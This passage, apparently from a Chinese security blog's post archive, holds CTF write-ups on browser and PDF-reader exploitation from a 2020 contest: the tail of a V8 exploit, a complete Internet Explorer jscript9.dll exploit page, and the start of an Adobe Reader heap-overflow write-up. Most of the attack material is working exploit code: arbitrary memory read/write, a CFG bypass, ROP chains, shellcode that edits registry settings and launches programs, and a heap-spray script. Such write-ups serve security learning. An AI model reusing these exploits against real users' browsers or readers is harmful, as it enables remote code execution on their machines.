&#123;   var o = a[0];   o[0] = obj;   return u64_l(faker[4]) - 1;&#125;function fakeObject(addr_to_fake) &#123;   var o = a[0];   faker[4] = p64(addr_to_fake + 1);   return o[0];&#125;function isInt(obj) &#123;   return obj % 1 === 0;&#125;var buf_addr = addressOf(buf);//alert(&quot;buf_addr=&quot;+buf_addr.toString(16));var backing_store_ptr = buf_addr + 0x14 + 0x8;//伪造一个ArrayBuffer用于任意地址读写faker[5] = p64(0,0x08202dbd);faker[6] = p64(0x080426dd,0x080426dd);faker[7] = p64(0xffffffff,0);faker[8] = p64(0,0);faker[9] = p64(0,2);//伪造一个FixedDoubleArray用于泄露地址，因为最开始，我们不知道compression ptr的高4字节是什么，因此用FixedDoubleArray可以进行相对寻址，从而泄露数据faker[10] = p64(0,0x0820317d);faker[11] = p64(0x080426dd,0x08342181)faker[12] = p64(0x7ffffffe,0x08042a31);faker[13] = p64(0x7ffffffe,0)//注意内存对齐if (parseInt(backing_store_ptr &amp; 0xf) == 0x4 || parseInt(backing_store_ptr &amp; 0xf) == 0xc) &#123;   faker[15] = p64(0x08042a31,0x7ffffffe);   faker[11] = p64(0x080426dd,0x08342195)&#125;//获得伪造的对象var arb_bufferArray = fakeObject(0x08342148);var fake_doubleArr = fakeObject(0x08342170);var offset;if (parseInt(backing_store_ptr &amp; 0xf) == 0x4 || parseInt(backing_store_ptr &amp; 0xf) == 0xc) &#123;   offset = (0xFFFFFFFF - 0x0834219b + backing_store_ptr) / 8;&#125; else &#123;   offset = (0xFFFFFFFF - 0x08342187 + backing_store_ptr) / 8;&#125;//泄露buf对象里的数据var v = fake_doubleArr[offset];//alert(&quot;offset=&quot;+offset.toString(16));//alert(&quot;heap_addr=&quot; + u64_h(v).toString(16) + u64_l(v).toString(16));//伪造ArrayBuffer的backing_store，从而实现任意地址读写faker[8] = p64(u64_l(v) + 0x10,u64_h(v));var fdv = new DataView(arb_bufferArray);var heap_t_l = fdv.getUint32(0,true);var heap_t_h =fdv.getUint32(4,true);//泄露libv8.so的地址faker[8] = p64(heap_t_l,heap_t_h);var elf_addr_l = fdv.getUint32(0,true);var elf_addr_h = fdv.getUint32(4,true);var elf_base_l = elf_addr_l - 0xeb4028;var elf_base_h = elf_addr_h;//alert(&quot;elf_base=&quot; + elf_base_h.toString(16) + elf_base_l.toString(16));var strlen_got_l = elf_base_l + 0xEF4DB8;var free_got_l = elf_base_l + 0xEF7A18;//0x0000000000b9ac48 : mov rdi, qword ptr [r13 + 0x20] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x30]var mov_rdi = elf_base_l + 0xb9ac48;//0x000000000076039f : mov rdx, qword ptr [rax] ; mov rax, qword ptr [rdi] ; mov rsi, r13 ; call qword ptr [rax + 0x10]var mov_rdx = elf_base_l + 0x76039f;var pop_rdi = elf_base_l + 0x6010bb;//泄露libc地址faker[8] = p64(strlen_got_l,elf_base_h);var strlen_addr_l = fdv.getUint32(0,true);var strlen_addr_h = fdv.getUint32(4,true);var libc_base_l = strlen_addr_l - 0x18b660;var libc_base_h = strlen_addr_h;var mov_rsp_rdx_l = libc_base_l + 0x5e650;var environ_ptr_addr_l = libc_base_l + 0x1EF2E0;var system_l = libc_base_l + 0x55410;//alert(&quot;libc_base=&quot; + libc_base_h.toString(16) + libc_base_l.toString(16));//alert(&quot;system_l=&quot; + libc_base_h.toString(16) + system_l.toString(16));//泄露栈地址faker[8] = p64(environ_ptr_addr_l,libc_base_h);var stack_addr_l = fdv.getUint32(0,true);var stack_addr_h = fdv.getUint32(4,true);//alert(&quot;stack_addr=&quot;+stack_addr_h.toString(16) + stack_addr_l.toString(16));faker[8] = p64(u64_l(v) + 0x80,u64_h(v));heap_t_l = fdv.getUint32(0,true);heap_t_h =fdv.getUint32(4,true);if (parseInt(heap_t_h) == 0) &#123;   location.reload();&#125; else &#123;   //泄露compression ptr的高4字节数据   faker[8] = p64(heap_t_l,heap_t_h);   var compression_ptr_high = fdv.getUint32(4,true);   //alert(&quot;compression_ptr_high=&quot;+compression_ptr_high.toString(16));   //泄露buf的数据区地址   v = fake_doubleArr[offset - 1];   var buf_data_addr_l = u64_l(v);   var buf_data_addr_h = u64_h(v);   //在数据区布下ROP等   dv.setFloat64(0,p64(buf_data_addr_l+0x10,buf_data_addr_h),true);   dv.setFloat64(0x40,p64(mov_rdx,elf_base_h),true);   dv.setFloat64(0x20,p64(mov_rsp_rdx_l,libc_base_h),true);   //rsp   dv.setFloat64(0x10,p64(buf_data_addr_l+0x2000,buf_data_addr_h),true);   //rop   dv.setFloat64(0x2000,p64(pop_rdi,elf_base_h),true);   dv.setFloat64(0x2008,p64(buf_data_addr_l+0x2018,buf_data_addr_h),true);   dv.setFloat64(0x2010,p64(system_l,libc_base_h),true)   var cmd = &quot;gnome-calculator\\x00&quot;;   var bufView = new Uint8Array(buf);   for (var i = 0, strlen = cmd.length; i &lt; strlen; i++) &#123;      bufView[0x2018+i] = cmd.charCodeAt(i);   &#125;   //修改0x20处为buf_data_addr   faker[8] = p64(0x20,compression_ptr_high);   fdv.setFloat64(0,p64(buf_data_addr_l,buf_data_addr_h),true);   //劫持栈返回地址为mov_rdi，将栈最终迁移到buf_data_addr里做ROP   var rop_addr_l = stack_addr_l - 0x1b18;   faker[8] = p64(rop_addr_l,stack_addr_h);   fdv.setFloat64(0,p64(mov_rdi,elf_base_h),true);&#125;    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n0x03 感想通过这一题，学习了v8方面的很多知识，对JIT也有了一定的了解\n0x04 参考强网杯2020线下GooExec你可能不知道的v8数组优化深入理解Js数组(v8 source)elements-kind.hGoogle Chrome V8 JIT - ‘LoadElimination::ReduceTransitionElementsKind’ Type Confusion\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"强网杯2020决赛RealWord的IE浏览器漏洞挖掘——PiAno(PA)","url":"/2020/11/23/qwb2020-final-PiAno/","content":"文章首发于安全KER https://www.anquanke.com/post/id/222678\n0x00前言最近在学浏览器方面的漏洞挖掘，就从强网杯的这道PiAno(PA)来分享一下我个人的收获与总结题目信息：**题目名称：**PiAno**旗帜名称：**PA**题目描述：**附件中提供了一个Win10虚拟机，虚拟机中存在一个patch过jscript9.dll的IE浏览器，挖掘并利用程序漏洞，实现任意代码执行，在靶机中弹出计算器程序。**靶机环境：**Win10 虚拟机。**附件信息：**Win10 虚拟机（与靶机一致）。**展示环境拓扑：**交换机连接选手攻击机和展示机，展示机使用VMware（最新版）运行靶机，靶机通过NAT方式连接到网络。验证过程：选手携带自己的攻击机上台展示题解，操作人员使用虚拟机中的IE浏览器访问选手的提供的页面。在规定的时间内，在靶机中弹出计算器程序判定为题解正确。**注意事项：**上台展示题解的时候注意关闭exp的调试信息。\n0x01 挖掘过程找到patch点从题目描述得知，被patch的文件是IE浏览器的jscript9.dll这个动态库，该库是IE浏览器的JS引擎，因此可以知道漏洞点出在JS上，并且靠JS来实现利用。IE浏览器分32位和64位，我们需要先确定是哪个版本的jscript9.dll被patch了，首先进入题目的虚拟机，查看64位下的jscript9.dll文件的版本，发现版本为11.0.19041.508，正好我本机的IE浏览器的jscript9.dll文件也是这个版本\n通过Fairdell HexCmp2文件差异对比，发现64位jscript9.dll没有被patch，32位的jscript9.dll被patch了，差异点如下\nDifferent between:First file: &quot;C:\\Users\\Administrator\\Desktop\\realword\\jscript9.dll&quot;Second file: &quot;C:\\Users\\Administrator\\Desktop\\realword\\jscript9_after.dll&quot;Shift: 0------------------------------------------------------------------------First file: &quot;C:\\Users\\Administrator\\Desktop\\realword\\jscript9.dll&quot;Second file: &quot;C:\\Users\\Administrator\\Desktop\\realword\\jscript9_after.dll&quot;Shift: 0Shift: 0------------------------------------------------------------------------000DFE00 |                0F 83 C9 | 000DFE00 |                90 90 90 |000DFE08 | 00 00 00                | 000DFE08 | 90 90 90                |000DFE10 |    3F                   | 000DFE10 |    06                   |000DFE18 |                      72 | 000DFE18 |                      EB |------------------------------------------------------------------------000DFE88 |          E8 EB 69 04 00 | 000DFE88 |          90 90 90 90 90 |------------------------------------------------------------------------\n分析patch点微软为开发者提供了自家产品的符号文件，我们可以用32位的windbg目录下的symchk程序单独下载dll的符号，得到一个pdb文件\nsymchk.exe jscript9.dll /s SRV*c:\\symbols\\*http://msdl.microsoft.com/download/symbols\n我们将jscript9.dll以及jscript9_patched.dll用IDA分析，然后将符号文件导入IDA后，跳转到差异处进行分析，该patch位于Js::JavascriptNativeIntArray::SetItem函数中，可以知道该漏洞与Js::JavascriptNativeIntArray有关，也就是js里的整数型数组有问题。\n发现有些指令直接被nop了，查看伪代码\n再查看一下未patch前的代码\n对比可以发现，在setItem操作中，patch掉了对数组下标的大小进行正向越界检查，index为无符号数,通过index - *v7计算数组的下标，然后v7[v8+4] = v6可以越界写int数据\n实现任意地址读写通过上面的分析可以知道，在这个js引擎中，整数数组已经具有了任意地址写的能力，但是还不具有任意地址读的能力。为此，我们先利用任意地址写的能力，修改intarray自身的头部的几个用于表示该数组长度范围的成员变量为-1，从而使得该intarray具有任意地址读的能力。IE9之后使用的是Chakra引擎，从代码仓库可以找到该引擎的源码，从而可以得到JavascriptNativeIntArray的结构，由于源码过于复杂，不容易分析出其成员变量的分布，因此我们直接用windbg进行动态调试，确定需要修改的相关变量的位置。\n首先写上测试用的html页面，启动32位IE浏览器，打开这个页面，当弹出对话框时，使用windbg attach到进程上\n&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;body&gt;    &lt;script&gt;\t  var vuln = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];\t  alert(&quot;ready to go!&quot;);\t  vuln[0x66] = 1;    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n接下来利用bp jscript9.dll基址+0xE09FA在此处设置断点后继续运行断点断下来后，可以看到ecx正是我们的数组下标·0x66，并且edi+0x10处正是intarray对象的数组数据区起始位置查看其前方的数据，可以发现有几个数据与我们的数组长度相当,我们将其全部改为0xFFFFFFFF以后发现该对象就能够进行任意地址读了。\n//修改自身的size，实现任意地址读写vuln[0x3ffffffe] = -1;vuln[0x3ffffffd] = -1;vuln[0x3ffffff6] = -1;\n具有任意地址读写以后，就是常规的利用了。\n泄露地址我们也看到，数据区前方就有jscript9.dll里的指针，进一步分析还可以知道这是一个虚表地址。\n\n因此直接越界读，泄露虚表地址得到jscript9.dll的地址，进而得到其他函数的地址\n//泄露vtable地址var vtable_addr = vuln[0x3ffffff2];var jscript9_base = vtable_addr - 0x37e8;var LoadLibraryExA_ptr = jscript9_base + 0x37600C;var GetProcAddress_ptr = jscript9_base + 0x3761A8;var VirtualProtect_ptr = jscript9_base + 0x376110;var RtlCaptureContext_ptr = jscript9_base + 0x376488;var pop_esp = jscript9_base + 0x774ff;var mov_esp_ebx = jscript9_base + 0x23721a;var add_esp = jscript9_base + 0x270d5c;var base = vuln[0x3ffffff8] + 0x10;//alert(&quot;jscript9_base=&quot;+jscript9_base.toString(16));//alert(&quot;base=&quot;+base.toString(16));//4字节地址对齐的任意地址读function arb_read(addr) &#123;   var offset = addr - base;if (offset &lt; 0) &#123;   offset = (0x100000000 + offset) / 4;&#125; else &#123;   offset = offset / 4;&#125;return vuln[offset];&#125;function packInt(value) &#123;   if (value &gt; 0x80000000) &#123;   value = value - 0x100000000;&#125;return value;&#125;var LoadLibraryExA_addr = arb_read(LoadLibraryExA_ptr);var GetProcAddress_addr = arb_read(GetProcAddress_ptr);var VirtualProtect_addr = arb_read(VirtualProtect_ptr);var RtlCaptureContext_addr = arb_read(RtlCaptureContext_ptr);\n现在就是劫持程序流了，该模块开启了CFG机制，因此不能将虚表里的函数劫持为gadgets，只能劫持为一个完整的函数。\nCFG绕过绕过的方法是先将虚表里的函数劫持为某些对我们利用有帮助的函数，然后进行后续的其他方法利用。RtlCaptureContext是一个非常有用的函数，其位于ntdll.dll模块里，这里我们已经通过IAT表泄露出了它的地址，该函数可以将当前的所有寄存器值保存到参数给定的内存空间里\n.text:4B307260                 public RtlCaptureContext.text:4B307260 RtlCaptureContext proc near             ; CODE XREF: sub_4B2F38E6+A↑p.text:4B307260                                         ; RtlRaiseException+B↓p ....text:4B307260.text:4B307260 var_4           = dword ptr -4.text:4B307260 ContextRecord   = dword ptr  4.text:4B307260.text:4B307260                 push    ebx.text:4B307261                 mov     ebx, [esp+4+ContextRecord].text:4B307265                 mov     [ebx+0B0h], eax.text:4B30726B                 mov     [ebx+0ACh], ecx.text:4B307271                 mov     [ebx+0A8h], edx.text:4B307277                 mov     eax, [esp+4+var_4].text:4B30727A                 mov     [ebx+0A4h], eax.text:4B307280                 mov     [ebx+0A0h], esi.text:4B307286                 mov     [ebx+9Ch], edi.text:4B30728C                 jmp     short loc_4B3072D1.text:4B30728C RtlCaptureContext endp.text:4B3072D1 loc_4B3072D1:                           ; CODE XREF: RtlCaptureContext+2C↑j.text:4B3072D1                 mov     word ptr [ebx+0BCh], cs.text:4B3072D7                 mov     word ptr [ebx+98h], ds.text:4B3072DD                 mov     word ptr [ebx+94h], es.text:4B3072E3                 mov     word ptr [ebx+90h], fs.text:4B3072E9                 mov     word ptr [ebx+8Ch], gs.text:4B3072EF                 mov     word ptr [ebx+0C8h], ss.text:4B3072F5                 pushf.text:4B3072F6                 pop     dword ptr [ebx+0C0h].text:4B3072FC                 mov     eax, [ebp+4].text:4B3072FF                 mov     [ebx+0B8h], eax.text:4B307305                 mov     eax, [ebp+0].text:4B307308                 mov     [ebx+0B4h], eax.text:4B30730E                 lea     eax, [ebp+8].text:4B307311                 mov     [ebx+0C4h], eax.text:4B307317                 mov     dword ptr [ebx], 10007h.text:4B30731D                 pop     ebx.text:4B30731E                 retn    4\n利用这一点，我们可以读出栈地址，然后可以利用任意地址读写的能力去劫持栈。\n通过观察，发现劫持虚表里的hasItem函数比较可靠，因为只有一个参数，正好可以给我们用于传递地址参数，由于虚表是只读的，因此我们直接伪造一个虚表，在对应位置伪造hasItem函数指针\n//伪造该对象的虚表，从而leak出寄存器地址var leak = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];leak[0x3ffffffe] = -1;leak[0x3ffffffd] = -1;leak[0x3ffffff6] = -1;var fake_vtable_addr = leak[0x3ffffff8] + 0x10;leak[31] = packInt(RtlCaptureContext_addr); //伪造hasItem函数指针//修改leak的虚表指针leak[0x3ffffff2] = fake_vtable_addr;\n要触发hasItem的调用，只需要利用数组对象的in语句\n//调用hasItem，结果存放于base地址处var x = (base in leak);var stack_addr = arb_read(base + 0xB4);\n劫持栈做ROP由于是数组对象的任意地址读写，我们如果直接用下标的方式去写，每次只能写4个字节数据，而劫持栈是需要一次性将ROP全部写到栈里去的，于是，我们发现了另一个函数Js::JavascriptArray::EntryPush，该函数会循环的将参数里的数组数据依次push到当前被调用的数组对象里因此，我们可以劫持Js::JavascriptArray::EntryPush的栈返回地址，当循环执行完成时，ROP需要的数据都已写到栈里，当Js::JavascriptArray::EntryPush执行ret时便能执行ROP链。\n完整利用exp.html&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;body&gt;    &lt;script&gt;\t  var vuln = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];\t  //修改自身的size，实现任意地址读写\t  vuln[0x3ffffffe] = -1;\t  vuln[0x3ffffffd] = -1;\t  vuln[0x3ffffff6] = -1;\t  //泄露vtable地址\t  var vtable_addr = vuln[0x3ffffff2];\t  var jscript9_base = vtable_addr - 0x37e8;\t  var LoadLibraryExA_ptr = jscript9_base + 0x37600C;\t  var GetProcAddress_ptr = jscript9_base + 0x3761A8;\t  var VirtualProtect_ptr = jscript9_base + 0x376110;\t  var RtlCaptureContext_ptr = jscript9_base + 0x376488;\t  var pop_esp = jscript9_base + 0x774ff;\t  var mov_esp_ebx = jscript9_base + 0x23721a;\t  var add_esp = jscript9_base + 0x270d5c;\t  var base = vuln[0x3ffffff8] + 0x10;\t  //alert(&quot;jscript9_base=&quot;+jscript9_base.toString(16));\t  //alert(&quot;base=&quot;+base.toString(16));\t  //4字节地址对齐的任意地址读\t  function arb_read(addr) &#123;\t     var offset = addr - base;\t\t if (offset &lt; 0) &#123;\t\t    offset = (0x100000000 + offset) / 4;\t\t &#125; else &#123;\t\t    offset = offset / 4;\t\t &#125;\t\t return vuln[offset];\t  &#125;\t  function packInt(value) &#123;\t     if (value &gt; 0x80000000) &#123;\t\t    value = value - 0x100000000;\t\t &#125;\t\t return value;\t  &#125;\t  \t  var LoadLibraryExA_addr = arb_read(LoadLibraryExA_ptr);\t  var GetProcAddress_addr = arb_read(GetProcAddress_ptr);\t  var VirtualProtect_addr = arb_read(VirtualProtect_ptr);\t  var RtlCaptureContext_addr = arb_read(RtlCaptureContext_ptr);\t  //alert(&quot;LoadLibraryExA_addr=&quot;+LoadLibraryExA_addr.toString(16));\t  //alert(&quot;GetProcAddress_addr=&quot;+GetProcAddress_addr.toString(16));\t  //alert(&quot;VirtualProtect_addr=&quot;+VirtualProtect_addr.toString(16));\t  //alert(&quot;RtlCaptureContext_addr=&quot;+RtlCaptureContext_addr.toString(16));\t  //伪造该对象的虚表，从而leak出寄存器地址\t  var leak = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];\t  leak[0x3ffffffe] = -1;\t  leak[0x3ffffffd] = -1;\t  leak[0x3ffffff6] = -1;\t  var fake_vtable_addr = leak[0x3ffffff8] + 0x10;\t  leak[31] = packInt(RtlCaptureContext_addr); //伪造hasItem函数指针\t  //修改leak的虚表指针\t  leak[0x3ffffff2] = fake_vtable_addr;\t  //调用hasItem，结果存放于base地址处\t  var x = (base in leak);\t  var stack_addr = arb_read(base + 0xB4);\t  //劫持JavascriptArray::EntryPush函数的返回地址\t  var rop_addr = stack_addr - 0x190;\t  \t  vuln[0] = 0x54464F53;\t  vuln[1] = 0x45524157;\t  vuln[2] = 0x63694D5C;\t  vuln[3] = 0x6F736F72;\t  vuln[4] = 0x575C7466;\t  vuln[5] = 0x6F646E69;\t  vuln[6] = 0x435C7377;\t  vuln[7] = 0x65727275;\t  vuln[8] = 0x6556746E;\t  vuln[9] = 0x6F697372;\t  vuln[10] = 0x6E495C6E;\t  vuln[11] = 0x6E726574;\t  vuln[12] = 0x53207465;\t  vuln[13] = 0x69747465;\t  vuln[14] = 0x5C73676E;\t  vuln[15] = 0x656E6F5A;\t  vuln[16] = 0x335C73;\t  /*ADVAPI32.dll字符串*/\t  vuln[17] = 0x41564441;\t  vuln[18] = 0x32334950;\t  vuln[19] = 0x6C6C642E;\t  vuln[20] = 0;\t  \t  var buff = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];\t  /*ucrtbase.dll字符串*/\t  buff[0] = 0x74726375;\t  buff[1] = 0x65736162;\t  buff[2] = 0x6C6C642E;\t  buff[3] = 0;\t  /*RegOpenKeyExA字符串*/\t  buff[4] = 0x4F676552;\t  buff[5] = 0x4B6E6570;\t  buff[6] = 0x78457965;\t  buff[7] = 0x41;\t  /*RegSetValueExA字符串*/\t  buff[8] = 0x53676552;\t  buff[9] = 0x61567465;\t  buff[10] = 0x4565756C;\t  buff[11] = 0x4178;\t  /*RegCloseKey字符串*/\t  buff[12] = 0x43676552;\t  buff[13] = 0x65736F6C;\t  buff[14] = 0x79654B;\t  /*system字符串*/\t  buff[15] = 0x74737973;\t  buff[16] = 0x6D65;\t  /*calc.exe字符串*/\t  buff[17] = 0x636C6163;\t  buff[18] = 0x6578652E;\t  buff[19] = 0;\t  \t  \t  buff[0x3ffffffe] = -1;\t  buff[0x3ffffffd] = -1;\t  buff[0x3ffffff6] = -1;\t  var strs_base = buff[0x3ffffff8] + 0x10;\t  \t  //修改vuln的index，然后利用push可以一次性写入多个值\t  vuln[0x3ffffff6] = (rop_addr - base) / 4;\t  vuln[0x3ffffffd] = (rop_addr - base) / 4;\t  alert(&quot;rop_addr=&quot;+rop_addr.toString(&quot;16&quot;));\t  \t  vuln.push(packInt(VirtualProtect_addr),packInt(rop_addr+0x18),packInt(rop_addr+0x18),0x300,0x40,packInt(rop_addr),packInt(0x81e58955),0x100ec,packInt(0xfc45c700),0x3,packInt(0xff5085c7),0x3532ffff,packInt(0x85c73030),packInt(0xffffff54),0x0,0x80068,0x68006a00,packInt(base+0x44),packInt(0x85c79090),packInt(0xffffff4c),packInt(LoadLibraryExA_addr),packInt(0xff4c95ff),packInt(0x8589ffff),packInt(0xffffff48),0x68909090,packInt(strs_base+0x10),packInt(0x85c79050),packInt(0xffffff44),packInt(GetProcAddress_addr),packInt(0xff4495ff),packInt(0x8589ffff),packInt(0xffffff40),0x68909090,packInt(strs_base+0x20),packInt(0xff48b5ff),packInt(0x95ffffff),packInt(0xffffff44),packInt(0xff3c8589),0x6890ffff,packInt(strs_base+0x30),packInt(0xff48b5ff),packInt(0x95ffffff),packInt(0xffffff44),packInt(0xff388589),packInt(0x858dffff),packInt(0xffffff34),0x66850,0x6a0002,0x68909090,packInt(base),0x168,0x4095ff80,0x6affffff,packInt(0xfc458d04),0x6a046a50,0x50858d00,0x50ffffff,packInt(0xff34b5ff),packInt(0x95ffffff),packInt(0xffffff3c),packInt(0xff34b5ff),packInt(0x95ffffff),packInt(0xffffff38),0x80068,0x68006a00,packInt(strs_base),packInt(0xff4c95ff),0x6890ffff,packInt(strs_base+0x3C),0x4495ff50,0x68ffffff,packInt(strs_base+0x44),0xD0FF);\t  //alert(&quot;done&quot;);    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n0x02 测试测试时需要关闭IE浏览器的保护模式，否则会由于IE浏览器的沙盒机制，系统函数调用失败\n0x03 感想通过本题学习了IE浏览器漏洞挖掘的一些利用手法，收获很大，RealWord还是比普通PWN有趣。\n0x04 参考1.如何绕过Windows 10的CFG机制https://www.freebuf.com/articles/system/126007.html2.CFG防护机制的简要分析 https://xz.aliyun.com/t/2587\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","堆溢出","windows漏洞利用"]},{"title":"强网杯2020决赛RealWord题ADoBe(ADB)","url":"/2020/11/16/qwb2020-final-adobe/","content":"文章首发于安全KER https://www.anquanke.com/post/id/222391\n0x00 前言第一次来强网杯线下，接触了realword题，收获很大，深有感触题目信息：**题目名称：**ADoBe**旗帜名称：**ADB**题目描述：**附件中给出了一个Adobe Reader DC可执行程序，请挖掘并利用该程序中的漏洞，在靶机中弹出计算器程序。靶机环境：Win10 虚拟机，默认安装配置，系统补丁安装至最新。系统安装了附件中提供中的Adobe Reader DC程序，并已关闭程序沙箱。**附件信息：**Adobe Reader DC程序及相关Dll文件，版本均与靶机中的一致。展示环境拓扑：交换机连接选手攻击机和展示机，展示机使用VMware（最新版）运行靶机，靶机通过NAT方式连接到网络。展示过程：选手携带自己的攻击机上台展示题解，攻击机需运行HTTP服务，供操作员下载能够利用程序漏洞的PDF文档。操作员打开PDF文档后，在规定的时间内，在靶机中弹出计算器程序判定为题解正确。注意事项：（1）在解题时，可通过在注册表项HKLM\\SOFTWARE\\Wow6432Node\\Policies\\Adobe\\Acrobat Reader\\DC\\FeatureLockDown中修改键值项bProtectedMode（DWORD类型），赋值为0来关闭Adobe Reader DC程序的沙箱；（2）上台展示题解的时候注意关闭exp的调试信息。\n0x01 挖掘过程从题目描述可以看出，这是要让我们对这个patch过的adobe reader软件进行漏洞挖掘，为了找出漏洞点，我们需要下载与当前版本一致的官方版本进行对比。将官方版本下载安装后，我们写一个脚本来查找到底是哪一个文件被patch过，脚本如下，就是简单的内容比对。\n#coding:utf8import ossrc_dir = u&#x27;C:\\\\Users\\\\Administrator\\\\Desktop\\\\realword\\\\Adobe附件\\\\Adobe\\\\Acrobat Reader DC&#x27; # 源文件目录地址comp_dest = u&#x27;C:\\\\Program Files (x86)\\\\Adobe\\Acrobat Reader DC&#x27;def list_all_files(rootdir):_files = []#列出文件夹下所有的目录与文件list_file = os.listdir(rootdir)for i in range(0,len(list_file)):# 构造路径path = os.path.join(rootdir,list_file[i])# 判断路径是否是一个文件目录或者文件# 如果是文件目录，继续递归if os.path.isdir(path):_files.extend(list_all_files(path))if os.path.isfile(path):_files.append(path)return _filesfiles = list_all_files(src_dir)for path in files:path2 = comp_dest + &#x27;\\\\&#x27; + path[len(src_dir)+1:]#print path2f = open(path,&#x27;rb&#x27;)content1 = f.read()f.close()try:f = open(path2,&#x27;rb&#x27;)content2 = f.read()f.close()except:continueif content1 != content2:print path\n经过比对，发现仅一个文件被修改过，那就是Adobe\\Acrobat Reader DC\\Reader\\plug_ins\\AcroForm.api文件，接下来，利用Fairdell HexCmp2差异对比工具来对比AcroForm.api与官方文件的差异之处。结果如下\nDifferent between:First file: &quot;C:\\Users\\Administrator\\Desktop\\AcroForm.api&quot;Second file: &quot;C:\\Users\\Administrator\\Desktop\\AcroForm_patched.api&quot;Shift: 0------------------------------------------------------------------------First file: &quot;C:\\Users\\Administrator\\Desktop\\AcroForm.api&quot;Second file: &quot;C:\\Users\\Administrator\\Desktop\\AcroForm_patched.api&quot;Shift: 0Shift: 0------------------------------------------------------------------------000001E0 | 68 F0 E2 30 1E | 000001E0 | 00 00 00 00 00 |------------------------------------------------------------------------0054B098 | 87 | 0054B098 | 8F |------------------------------------------------------------------------0054B0C0 | EE | 0054B0C0 | FE |------------------------------------------------------------------------\n打开IDA分析，跳转到差异地址处，发现指令由无符号指令patch成了有符号指令这题patch后的漏洞类型与腾讯安全玄武实验室分析CVE-2019-8014类似，甚至可以说，本题比CVE-2019-8014的利用更加简单方便，首先阅读腾讯实验室的文章，可以发现CVE-2019-8014的堆溢出写数据，不能做到很精准的控制，如果要向前溢出修改ArrayBuffer的byteLength时，那么从byteLength处到溢出堆的起始点都会被覆盖为同一个数据，也就是ArrayBuffer的DataView指针也会被覆盖，进程使用ArrayBuffer对象时会因为其DataView指针指向一个无效地址而崩溃，因此该利用需要事先在对应位置布置好fake DataView堆布局。\nArrayBufferArrayBuffer是JavaScript里的一种类，可以理解为是一个字节数组的包装类，如果要对ArrayBuufer的内存进行读写，就需要建立DataView对象来进行操作。在Adobe中，使用的JS引擎为SpiderMonkey，在早期的Adobe Reader中，其JS的版本不支持ArrayBuffer这个类，好在这是最新版的Adobe Reader，其ArrayBuffer类的大致结构如下\nclass ArrayBuffer &#123; public:  uint32_t flags;               // flags  uint32_t byteLength;   // 数组长度  uint32_t dataview_obj;            // dataview 对象指针  uint32_t length;              // // ... //数据区&#125;;\n结合JS达到利用由于Adobe Reader本身支持JavaScript，我们希望利用堆溢出修改ArrayBuffer的byteLength为0xFFFFFFFF，从而使得该ArrayBuffer具有任意地址读写的能力，然后可以利用JavaScript对内存进行读写，劫持程序流；为了达到这个目的，首先我们得利用堆喷构造好堆布局如下我们希望在Adobe Reader解析bitmap之前时，ArrayBuffer对象后方能间隔的出现一些已经释放了的堆（“空洞”），这样解析bitmap时，存放bitmap的解压数据的堆(line)正好落到空洞里，然后通过bitmap解析时的堆溢出，向前方溢出，修改ArrayBuffer里的byteLength。\n精准控制内存首先，xpos_是完全可以通过伪造bitmap，使得其值累加到0xFFFFFFFF，由于这里xpos_是有符号数，因此右移1位的操作，其符号位不变，仍然可以保持为负数，正是因为其符号能保持为负数，我们可以精准的向上方溢出。为了确定溢出的距离，我们使用动态调试，这里，我们选择堆喷的大小为0x140，因此，我们事先new ArrayBuffer(0x130)，然后间隔的释放一些ArrayBuffer对象。在Adobe Reader的pdf文档里，我们可以在xdp标签里嵌入\n&lt;event activity=&quot;initialize&quot; name=&quot;event__initialize&quot;&gt;        &lt;script contentType=&quot;application/x-javascript&quot;&gt;        &lt;/script&gt;&lt;/event&gt;\n该标签里的脚本会在Adobe Reader打开pdf文件开始时执行，也就是在解析bitmap之前执行，因此，我们可以在这里进行堆喷布局，pdf模板内xdp标签内的关键内容如下\n&lt;variables&gt;      &lt;script name=&quot;spray&quot; contentType=&quot;application/x-javascript&quot;&gt;         //全局变量var size = 200;         var array = new Array(size);      &lt;/script&gt;      &lt;?templateDesigner expand 1?&gt;   &lt;/variables&gt;   &lt;event activity=&quot;initialize&quot; name=&quot;event__initialize&quot;&gt;     &lt;script contentType=&quot;application/x-javascript&quot;&gt;        // 在漏洞触发之前，我们布局好堆布局        function fillHeap() &#123;            var i;   var j;            spray.array[0] = new ArrayBuffer(0x130);   //var dv = new DataView(spray.array[0]);   // dv.setUint32(0, 0x66666666, true);   //dv = null;            for (i = 0; i &amp;lt; spray.array.length; ++i) &#123;               spray.array[i] = spray.array[0].slice();\t  //spray.array[i] = new ArrayBuffer(0x130);      //var dv = new DataView(spray.array[i]);      //dv.setUint32(0,i, true);            &#125;   for (j = 0; j &amp;lt; 0x1000; j++) &#123;               for (i = spray.size - 1; i &amp;gt; spray.size / 4; i -= 10) &#123;                  spray.array[i] = null;               &#125;   &#125;        &#125;        fillHeap();        app.alert(&quot;[!] ready to go&quot;);     &lt;/script&gt;   &lt;/event&gt;\n堆布局配置好了，接着我们分析一下程序如何才能到达漏洞点进而溢出\nunsigned int __thiscall sub_20D4B4AF(_DWORD *this)&#123;  _DWORD *v1; // edi  int v2; // ecx  bool v3; // zf  int v4; // eax  unsigned int v5; // esi  int v6; // eax  int v7; // ecx  int v8; // ecx  unsigned __int16 v9; // ax  int v10; // edx  unsigned int v11; // esi  int v12; // ecx  int v13; // ecx  int v14; // ecx  int v15; // ecx  int v16; // ecx  _DWORD *v17; // ecx  int v18; // ecx  int v19; // ecx  int v20; // ecx  double v21; // xmm1_8  double v22; // xmm4_8  __int16 v23; // cx  unsigned int height; // ebx  unsigned int result; // eax  unsigned int v26; // esi  int v27; // ecx  int v28; // eax  int v29; // ecx  int v30; // eax  int v31; // ecx  unsigned int v32; // ebx  int v33; // eax  int v34; // 